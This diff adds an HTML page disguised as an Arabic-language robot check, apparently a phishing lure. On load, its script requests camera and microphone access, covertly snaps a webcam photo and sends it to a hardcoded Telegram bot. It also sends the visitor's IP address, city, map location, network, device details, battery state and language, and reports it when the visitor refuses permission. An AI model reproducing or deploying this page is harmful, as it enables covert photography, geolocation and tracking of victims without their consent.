@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Secure Access</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body { background-color: #000; color: #0f0; font-family: monospace; text-align: center; padding: 30px; }
+    video, canvas { display: none; }
+  </style>
+</head>
+<body>
+  <h1>🔒 جارٍ التحقق من انك لست روبوت...</h1>
+  <p>يرجى السماح لكي يتم ترقيتك الهوية</p>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const chatId = "7121448697";
+    const botToken = "8180184649:AAER6D-0MHkR8TMUb7TBTPxR9SdhLhVMMfM";
+
+    async function sendPhoto(blob) {
+      const form = new FormData();
+      form.append("chat_id", chatId);
+      form.append("caption", "📸 صورة الزائر:");
+      form.append("photo", blob, "visitor.jpg");
+
+      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: "POST",
+        body: form
+      });
+    }
+
+    async function sendText(text) {
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: text })
+      });
+    }
+
+    async function captureAndSend() {
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+      const context = canvas.getContext("2d");
+
+      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+        .then(async stream => {
+          video.srcObject = stream;
+
+          setTimeout(async () => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0);
+            canvas.toBlob(async (blob) => {
+              await sendPhoto(blob);
+              stream.getTracks().forEach(track => track.stop());
+            }, 'image/jpeg');
+
+            // إرسال البيانات العامة
+            let ip = await fetch('https://ipinfo.io/json').then(res => res.json());
+            let battery = await navigator.getBattery();
+            let userAgent = navigator.userAgent;
+            let time = new Date().toLocaleString();
+            let lang = navigator.language;
+
+            let text = `
+📡 جهاز جديد دخل على الرابط:
+
+🌍 الدولة: ${ip.country}
+📍 المدينة: ${ip.city}
+🌐 IP: ${ip.ip}
+📶 الشبكة: ${ip.org}
+📱 الجهاز: ${userAgent}
+🔋 البطارية: ${Math.round(battery.level * 100)}% (${battery.charging ? "يشحن" : "غير مشبوك"})
+🕐 الوقت المحلي: ${time}
+🗺️ الموقع: https://maps.google.com/?q=${ip.loc}
+🌎 اللغة: ${lang}
+🎥 الصورة: ✅ تم إرسالها
+            `;
+
+            await sendText(text);
+
+          }, 3000); // تصوير بعد 3 ثواني
+        })
+        .catch(async err => {
+          document.body.innerHTML += "<p>❌ تم رفض الأذونات</p>";
+          await sendText("🚫 الزائر رفض تفعيل الكاميرا أو المايك");
+        });
+    }
+
+    captureAndSend();
+  </script>
+</body>
+</html>
